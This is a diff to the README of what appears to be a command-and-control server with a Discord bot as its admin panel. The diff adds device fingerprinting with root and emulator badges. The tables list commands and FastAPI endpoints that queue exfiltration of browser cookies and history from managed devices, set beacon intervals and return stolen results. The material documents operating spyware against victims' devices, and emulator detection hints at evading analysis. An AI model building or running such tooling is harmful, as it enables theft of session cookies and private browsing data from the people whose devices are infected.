@@ -159,7 +159,8 @@ The Discord bot serves as the **admin panel** for the C2 server. It accepts comm
 
 | Command | Arguments | Description |
 |---|---|---|
-| `/show-devices` | — | Lists all managed devices with their status and emulator badge (🤖) |
+| `/show-devices` | — | Lists all managed devices with emulator (🤖) and root (🔓) badges |
+| `/device-info` | `device` | Full fingerprint: OS, carrier, installed-app count, root/emulator flags |
 | `/set-beacon-interval` | `15` \| `30` \| `60` \| `120` (autocomplete) | Sets the beacon interval (seconds) |
 | `/request-cookies` | — | Shows cached cookies **and** auto-queues a fresh exfiltration for all devices |
 | `/request-history` | `device` (optional, default `*`) | Queues a history exfiltration task |
@@ -181,7 +182,8 @@ The FastAPI server exposes two groups of endpoints:
 
 | Method | Endpoint | Description |
 |---|---|---|
-| `GET` | `/admin/devices` | List all registered devices |
+| `GET` | `/admin/devices` | List all registered devices (with emulator/root flags) |
+| `GET` | `/admin/device-info/{name}` | Full fingerprint for a specific device |
 | `GET` | `/admin/cookies` | Get cookies from all devices |
 | `GET` | `/admin/results` | Get latest exfiltrated result per task type per device |
 | `POST` | `/admin/beacon-interval` | Set beacon interval |
